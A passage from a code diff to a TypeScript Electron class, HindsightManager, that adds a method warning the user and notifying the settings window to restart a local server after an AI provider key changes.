       console.log('[HindsightManager] app-managed server tree terminated on quit.');
@@ -563,5 +1007,35 @@ export class HindsightManager {
   /** Async wrapper kept for API compatibility / non-quit callers. Delegates to stopSync. */
   async stop(): Promise<void> {
     this.stopSync();
+  }
+
+  /**
+   * Notify the Hindsight layer that an AI provider key was just saved via the AI Providers
+   * screen. When an app-managed server is already running, the child inherited the OLD env at
+   * spawn time — it won't see the new key until restart. We DON'T auto-restart here
+   * (mid-session disruption + first-boot ~3min startup cost); instead we log a clear hint
+   * the user can act on, and broadcast a `hindsight-restart-needed` event so the Settings UI
+   * can surface a small inline nudge (see IntelligenceSettings.tsx). When no app-managed
+   * server is running, this is a no-op — a fresh auto-spawn will pick up the new key
+   * naturally. Never throws.
+   */
+  notifyHindsightOfKeyChange(providerLabel: string): void {
+    try {
+      if (!this.isAppManaged || !this.serverProcess?.pid) return; // no live app-managed server
+      console.warn(
+        `[HindsightManager] AI key changed (${providerLabel}) but app-managed Hindsight ` +
+        'server is already running — restart it to pick up the new key.'
+      );
+      try {
+        const { BrowserWindow } = require('electron') as typeof import('electron');
+        BrowserWindow.getAllWindows().forEach((win) => {
+          if (!win.isDestroyed()) {
+            win.webContents.send('hindsight-restart-needed', { provider: providerLabel });
+          }
+        });
+      } catch { /* electron unavailable (headless/test) — log-only is enough */ }
+    } catch (e: any) {
+      console.warn('[HindsightManager] notifyHindsightOfKeyChange skipped (non-fatal):', e?.message);
+    }
   }
 }
